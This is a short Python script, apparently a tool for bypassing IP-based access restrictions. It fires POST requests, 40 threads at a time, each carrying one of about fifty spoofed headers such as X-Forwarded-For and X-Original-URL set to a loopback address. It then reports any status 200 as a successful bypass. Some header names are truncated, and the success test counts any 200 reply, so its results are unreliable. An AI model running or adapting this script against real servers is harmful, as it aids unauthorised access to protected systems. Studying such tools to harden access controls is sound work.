import requests
from rich import box
from rich.markdown import Markdown
from rich.text import Text
from rich.panel import Panel
from rich.console import Console
from  concurrent.futures import ThreadPoolExecutor

console = Console()



mans = ['X-Originally-Forwarded-For', 'X-Originating- ', 'X-Originating-IP', 'True-Client-IP', 'X-WAP-Profile', 'From', 'Profile', 'X-Arbitrary', 'X-HTTP-DestinationURL', 'X-Forwarded-Proto', 'Destination', 'Proxy', 'CF-Conne', 'CF-Conne', 'Referer', 'X-Custom-IP-Authorization', 'X-Custom-IP-Authorization..;', 'X-Originating-IP', 'X-Forwarded-For', 'X-Remote-IP', 'X-Client-IP', 'X-Hos', 'X-Forwarded-Host', 'X-Original-URL', 'X-Rewrite-URL', 'Content-Length', 'X-ProxyUser-Ip', 'Base-Url', 'Client-IP', 'Http-Url', 'Proxy-Host', 'Proxy-Url', 'Real-Ip', 'Redirect', 'Referrer', 'Request-Uri', 'Uri', 'Url', 'X-Forward-For', 'X-Forwarded-By', 'X-Forwarded-For-Original', 'X-Forwarded-Server', 'X-Forwarded', 'X-Forwarder-For', 'X-Http-Destinationurl', 'X-Http-Host-Override', 'X-Original-Remote-Addr', 'X-Proxy-Url', 'X-Real-Ip', 'X-Remote-Addr', 'X-OReferrer']
urls = "https://httpbin.org/post"

def payloads1(url, head):
    try:
        send = requests.post(url, headers=head)
        if send.status_code == 200:
            console.print(Panel(f"[b white]Success full Bypass[/b white] [b green]{url}, {head}, status: {send.status_code}[/b green]", box=box.HEAVY, style="blink blue", expand=False))
        else:
            console.print(f"bypass failled for {head}, status: {send.status_code}", style="bold red")
    except Exception as e:
        print(e)


# if __name__ == "__main__":
#     with ThreadPoolExecutor(40) as pool:
#         for x in mans:
#             headers = {x:'127.0.0.1, 68.180.194.242'}
#             pool.submit(payloads1,urls,headers)